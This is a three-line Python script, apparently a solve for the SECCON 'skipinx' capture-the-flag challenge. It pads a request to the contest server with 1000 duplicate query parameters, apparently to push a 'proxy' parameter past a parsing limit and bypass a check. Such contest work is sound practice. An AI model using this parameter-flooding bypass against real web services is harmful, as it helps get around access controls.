import requests
URL = "http://skipinx.seccon.games:8080/?proxy=lol&" + "&".join(["a=b"]*1000)
print(requests.get(URL).content)